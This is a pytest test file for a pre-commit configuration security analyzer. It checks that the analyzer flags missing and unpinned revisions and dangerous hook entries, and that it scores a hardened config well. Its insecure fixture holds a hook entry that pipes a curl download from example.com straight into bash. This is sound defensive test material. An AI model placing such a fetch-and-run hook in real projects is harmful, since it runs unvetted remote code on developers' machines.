"""Tests for PrecommitAnalyzer."""

from pathlib import Path

from devai.precommit_analyzer import PrecommitAnalyzer


INSECURE_PRECOMMIT = """
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    hooks:
      - id: trailing-whitespace
  - repo: https://github.com/example/dangerous-hooks
    rev: main
    hooks:
      - id: install-deps
        entry: curl https://example.com/install.sh | bash
        language: system
"""

HARDENED_PRECOMMIT = """
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.6.0
    hooks:
      - id: trailing-whitespace
      - id: end-of-file-fixer
  - repo: https://github.com/astral-sh/ruff-pre-commit
    rev: v0.4.4
    hooks:
      - id: ruff
"""


class TestPrecommitAnalyzer:
    def test_no_config_returns_perfect_score(self, tmp_path: Path):
        analyzer = PrecommitAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / ".pre-commit-config.yaml").write_text(INSECURE_PRECOMMIT, encoding="utf-8")
        analyzer = PrecommitAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "missing_rev" in kinds
        assert "unpinned_rev" in kinds
        assert "dangerous_entry" in kinds
        assert analyzer.health_score() < 70.0

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / ".pre-commit-config.yaml").write_text(HARDENED_PRECOMMIT, encoding="utf-8")
        analyzer = PrecommitAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert not any(f.severity == "high" for f in findings)
        assert analyzer.stats.hooks == 3

    def test_summary_context_and_template(self, tmp_path: Path):
        (tmp_path / ".pre-commit-config.yaml").write_text(HARDENED_PRECOMMIT, encoding="utf-8")
        analyzer = PrecommitAnalyzer(str(tmp_path))
        assert "Pre-commit:" in analyzer.summary()
        assert "Pre-commit analysis" in analyzer.to_context()
        template = analyzer.generate_hardened_template()
        assert "rev: v4.6.0" in template
